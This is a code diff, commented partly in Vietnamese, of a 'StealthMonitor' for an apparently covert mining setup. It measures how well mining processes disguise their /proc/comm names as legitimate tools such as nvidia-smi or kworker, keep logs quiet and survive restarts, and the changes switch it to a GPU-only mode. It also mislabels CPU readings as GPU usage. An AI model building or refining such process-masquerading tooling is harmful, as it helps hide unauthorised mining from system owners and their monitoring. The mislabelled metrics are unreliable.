@@ -8,7 +8,7 @@ và validate **SUCCESS CRITERIA** (tiêu chí thành công).
 ✅ SUCCESS CRITERIA:
 1. Log Pollution: Giảm từ 30+ warnings/hour → 0
 2. Process Stealth: /proc/comm ≠ binary name trong >90% thời gian  
-3. Performance: <1% CPU overhead cho stealth maintenance
+3. Performance: <1% GPU overhead cho stealth maintenance
 4. Reliability: Stealth survive qua restarts và process interruptions
 """
 
@@ -33,17 +33,13 @@ class StealthMonitor:
     
     def __init__(self):
         self.log_dir = Path("/app/mining_environment/logs")
-        self.cpu_log = self.log_dir / "cpu_cloaking_manager.log"
+        # CPU logging removed - GPU-only mode
         self.gpu_log = self.log_dir / "mining_environment_gpu_stealth.log"
         
         # Expected binary names (to detect when stealth fails)
         self.binary_names = {"ml-inference", "inference-cuda"}
         
-        # Stealth name patterns
-        self.cpu_stealth_names = {
-            "systemd-sleep", "kworker/0:1H", "migration/0", 
-            "rcu_gp", "systemd-journal", "cron"
-        }
+        # Stealth name patterns - GPU-only mode
         self.gpu_stealth_names = {
             "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py",
             "nvidia-settings", "gpu-manager", "glxgears",
@@ -91,7 +87,7 @@ class StealthMonitor:
             
             if is_stealth_active:
                 results["stealth_active"] += 1
-                stealth_type = "CPU" if comm_name in self.cpu_stealth_names else "GPU" if comm_name in self.gpu_stealth_names else "UNKNOWN"
+                stealth_type = "GPU" if comm_name in self.gpu_stealth_names else "UNKNOWN"
                 results["details"].append({
                     "pid": pid,
                     "comm_name": comm_name,
@@ -120,42 +116,25 @@ class StealthMonitor:
         one_hour_ago = current_time - timedelta(hours=1)
         
         results = {
-            "cpu_warnings": 0,
             "gpu_warnings": 0,
             "total_warnings": 0,
             "time_period": "last_1_hour"
         }
         
-        # Count CPU warnings
-        if self.cpu_log.exists():
-            try:
-                with open(self.cpu_log, 'r') as f:
-                    for line in f:
-                        if "🚫 [SAFE_DISGUISE]" in line and "access_denied" in line:
-                            # Extract timestamp
-                            timestamp_match = re.search(r'(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', line)
-                            if timestamp_match:
-                                try:
-                                    log_time = datetime.strptime(timestamp_match.group(1), '%Y-%m-%d %H:%M:%S')
-                                    if log_time >= one_hour_ago:
-                                        results["cpu_warnings"] += 1
-                                except ValueError:
-                                    continue
-            except Exception as e:
-                print(f"⚠️ [STEALTH-MONITOR] Error reading CPU log: {e}")
+        # CPU warning monitoring removed - GPU-only mode
         
         # GPU logs typically don't have these warnings (they use different approach)
-        results["total_warnings"] = results["cpu_warnings"] + results["gpu_warnings"]
+        results["total_warnings"] = results["gpu_warnings"]
         
         return results
     
     def measure_stealth_performance_overhead(self) -> Dict[str, float]:
         """
-        **SUCCESS CRITERIA 3**: Performance: <1% CPU overhead cho stealth maintenance
+        **SUCCESS CRITERIA 3**: Performance: <1% GPU overhead cho stealth maintenance
         """
         processes = self.get_mining_processes()
         results = {
-            "total_cpu_percent": 0.0,
+            "total_gpu_percent": 0.0,
             "stealth_overhead_estimate": 0.0,
             "process_count": len(processes)
         }
@@ -163,11 +142,12 @@ class StealthMonitor:
         try:
             for pid, _ in processes:
                 proc = psutil.Process(pid)
-                cpu_percent = proc.cpu_percent(interval=1)
-                results["total_cpu_percent"] += cpu_percent
+                # GPU processes - monitor for stealth overhead only
+                gpu_percent = proc.cpu_percent(interval=1)  # Still use CPU monitoring for overhead calculation
+                results["total_gpu_percent"] += gpu_percent
             
             # Estimate stealth overhead (very rough approximation)
-            # Stealth threads run every 15-20 seconds with minimal CPU usage
+            # Stealth threads run every 15-20 seconds with minimal GPU usage
             estimated_stealth_overhead = len(processes) * 0.1  # 0.1% per process
             results["stealth_overhead_estimate"] = estimated_stealth_overhead
             
@@ -209,7 +189,6 @@ class StealthMonitor:
         # SUCCESS CRITERIA 1: Log Pollution
         log_data = report["log_pollution"]
         print(f"📊 **LOG POLLUTION**: {log_data['total_warnings']} warnings in {log_data['time_period']}")
-        print(f"   ├─ CPU Warnings: {log_data['cpu_warnings']}")
         print(f"   ├─ GPU Warnings: {log_data['gpu_warnings']}")
         status_1 = "✅ PASS" if report["success_criteria"]["log_pollution_ok"] else "❌ FAIL"
         print(f"   └─ Status: {status_1} (Target: 0 warnings/hour)")
@@ -231,7 +210,7 @@ class StealthMonitor:
         # SUCCESS CRITERIA 3: Performance
         perf_data = report["performance_overhead"]
         print(f"\n⚡ **PERFORMANCE OVERHEAD**: {perf_data['stealth_overhead_estimate']:.2f}% estimated")
-        print(f"   ├─ Total CPU Usage: {perf_data['total_cpu_percent']:.1f}%")
+        print(f"   ├─ Total GPU Usage: {perf_data['total_gpu_percent']:.1f}%")
         print(f"   ├─ Process Count: {perf_data['process_count']}")
         status_3 = "✅ PASS" if report["success_criteria"]["performance_overhead_ok"] else "❌ FAIL"
         print(f"   └─ Status: {status_3} (Target: <1% overhead)")
